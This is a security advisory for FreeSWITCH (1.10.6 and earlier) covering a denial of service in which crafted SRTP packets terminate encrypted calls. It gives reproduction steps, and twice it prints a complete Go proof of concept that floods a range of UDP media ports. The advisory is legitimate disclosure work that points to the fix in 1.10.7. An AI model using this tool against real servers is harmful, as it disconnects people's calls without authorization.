# FreeSWITCH susceptible to Denial of Service via invalid SRTP packets

High

[andywolk](/andywolk)
published
GHSA-jh42-prph-gp36
Oct 25, 2021

## Package

FreeSWITCH
(C)

## Affected versions

<= 1.10.6

## Patched versions

1.10.7

## Description

## Summary

When handling SRTP calls, FreeSWITCH is susceptible to a DoS where calls can be terminated by remote attackers. This attack can be done continuously, thus denying encrypted calls during the attack.

## Description

When a media port that is handling SRTP traffic is flooded with a specially crafted SRTP packet, the call is terminated leading to denial of service. This issue was reproduced when using the SDES key exchange mechanism in a SIP environment as well as when using the DTLS key exchange mechanism in a WebRTC environment.

The call disconnection occurs due to line 6331 in the source file `switch_rtp.c`, which disconnects the call when the total number of SRTP errors reach a hard-coded threshold (100):

```
if (errs >= MAX_SRTP_ERRS) {
    // ...
    switch_channel_hangup(channel, SWITCH_CAUSE_SRTP_READ_ERROR);
}
```
## Impact

By abusing this vulnerability, an attacker is able to disconnect any ongoing calls that are using SRTP. The attack does not require authentication or any special foothold in the caller's or the callee's network.

## How to reproduce the issue

1. Prepare a FreeSWITCH instance that is publicly available and that can handle SRTP calls (`<X-PRE-PROCESS cmd="set" data="rtp_secure_media=true"/>`)
2. Prepare two SIP clients that can handle SRTP communication, such as Zoiper, and register against the FreeSWITCH instance
3. Prepare an attacker machine which has a different IP than that of the caller, callee or the FreeSWITCH instance
4. Save the below Go code and compile the application, naming it `freeswitch-srtp-dos`
5. Copy `freeswitch-srtp-dos` to the attacker machine
6. Perform a call between the agents using SRTP
7. Run the `freeswitch-srtp-dos` application against the target FreeSWITCH server: `./freeswitch-srtp-dos -ip <freeswitch_ip>`
8. Observe that when the active media ports are reached, FreeSWITCH will report "SRTP audio unprotect failed with code 21" multiple times, until the call is terminated

```
package main

import (
	"flag"
	"fmt"
	"net"
)

func main() {
	var minport, maxport, count int
	var ip string

	flag.IntVar(&minport, "min-port", 16384, "port-range minimum value")
	flag.IntVar(&maxport, "max-port", 32768, "port-range maximum value")
	flag.IntVar(&count, "count", 200, "packet count per port")
	flag.StringVar(&ip, "ip", "", "target IPv4 address")
	flag.Parse()

	listener, err := net.ListenPacket("udp", "0.0.0.0:0")
	if err != nil {
		panic(err)
	}

	fmt.Printf("sending %d packets on each port, port range %d-%d\n",
		count, minport, maxport)

	addr := &net.UDPAddr{IP: net.ParseIP(ip)}
	for i := minport; i < maxport+1; i++ {
		fmt.Printf("\rattacking port: %d", i)
		addr.Port = i
		for j := 0; j < count; j++ {
			listener.WriteTo([]byte("\x80\x00p(\t\xcd-\x15\xfd>\\\x86A"), addr)
		}
	}
}
```
## Solution and recommendations

Update to FreeSWITCH version >= 1.10.7

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

## TL;DR

When handling SRTP calls, FreeSWITCH is susceptible to a DoS where calls can be terminated by remote attackers. This
attack can be done continuously, thus denying encrypted calls during the attack.

## Description

When a media port that is handling SRTP traffic is flooded with a specially crafted SRTP packet, the call is terminated
leading to denial of service. This issue was reproduced when using the SDES key exchange mechanism in a SIP environment
as well as when using the DTLS key exchange mechanism in a WebRTC environment.

The call disconnection occurs due to line 6331 in the source file `switch_rtp.c`, which disconnects the call when the
total number of SRTP errors reach a hard-coded threshold (100):

```c
if (errs >= MAX_SRTP_ERRS) {
    // ...
    switch_channel_hangup(channel, SWITCH_CAUSE_SRTP_READ_ERROR);
}
```

## Impact

By abusing this vulnerability, an attacker is able to disconnect any ongoing calls that are using SRTP. The attack does
not require authentication or any special foothold in the caller's or the callee's network.

## How to reproduce the issue

1. Prepare a FreeSWITCH instance that is publicly available and that can handle SRTP calls (`<X-PRE-PROCESS cmd="set"
data="rtp_secure_media=true"/>`)
2. Prepare two SIP clients that can handle SRTP communication, such as Zoiper, and register against the FreeSWITCH
instance
3. Prepare an attacker machine which has a different IP than that of the caller, callee or the FreeSWITCH instance
4. Save the below Go code and compile the application, naming it `freeswitch-srtp-dos`
5. Copy `freeswitch-srtp-dos` to the attacker machine
6. Perform a call between the agents using SRTP
7. Run the `freeswitch-srtp-dos` application against the target FreeSWITCH server: `./freeswitch-srtp-dos -ip
<freeswitch_ip>`
8. Observe that when the active media ports are reached, FreeSWITCH will report "SRTP audio unprotect failed with code
21" multiple times, until the call is terminated

```go
package main

import (
        "flag"
        "fmt"
        "net"
)

func main() {
        var minport, maxport, count int
        var ip string

        flag.IntVar(&minport, "min-port", 16384, "port-range minimum value")
        flag.IntVar(&maxport, "max-port", 32768, "port-range maximum value")
        flag.IntVar(&count, "count", 200, "packet count per port")
        flag.StringVar(&ip, "ip", "", "target IPv4 address")
        flag.Parse()

        listener, err := net.ListenPacket("udp", "0.0.0.0:0")
        if err != nil {
                panic(err)
        }

        fmt.Printf("sending %d packets on each port, port range %d-%d\n",
                count, minport, maxport)

        addr := &net.UDPAddr{IP: net.ParseIP(ip)}
        for i := minport; i < maxport+1; i++ {
                fmt.Printf("\rattacking port: %d", i)
                addr.Port = i
                for j := 0; j < count; j++ {
                        listener.WriteTo([]byte("\x80\x00p(\t\xcd-\x15\xfd>\\\x86A"), addr)
                }
        }
}
```

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

```
> ```
> Instead of disconnecting the call, FreeSWITCH should simply ignore packets that fail message authentication or replay
> checks.
>
> ```

```
